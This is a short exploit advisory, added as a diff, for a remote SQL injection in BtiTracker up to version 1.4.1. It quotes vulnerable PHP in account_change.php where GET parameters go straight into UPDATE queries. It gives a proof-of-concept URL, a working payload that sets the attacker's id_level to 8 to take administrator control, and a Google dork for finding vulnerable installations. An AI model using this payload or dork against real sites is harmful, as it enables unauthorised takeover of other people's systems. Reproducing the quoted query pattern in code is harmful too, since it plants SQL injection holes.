@@ -1,0 +1,29 @@
+#################################################################################
+#										
+#	BtiTracker <=v1.4.1 Remote SQL Injection Exploit	              
+#									
+# Discovered by: m@ge|ozz - babbano@gmail.com					
+# Vulnerabitity: Remote Sql Injection /	                                        
+# Problem: Any user can be Administrator					
+# Website Vendor: http://www.btiteam.org					
+# 										
+# Vulnerable Code (account_change.php):						
+#										
+# if (isset($_GET["style"]))       						
+# @mysql_query("UPDATE users SET style=$style WHERE id=".$CURUSER["uid"]);      
+# 										
+# if (isset($_GET["langue"])) 							
+# @mysql_query("UPDATE users SET language=$langue WHERE id=".$CURUSER["uid"]);		
+#										
+# PoC: account_change.php?style=2[SQL]&returnto=%2F				
+#      										
+# Example to gain admin control: account_change.php?style=1,id_level=8								
+#										
+# 										
+# GoogleDork: "by Btiteam"							
+#										
+# Shoutz: - eVolVe or Die - 							
+#										
+#################################################################################
+
+# milw0rm.com [2007-05-22]
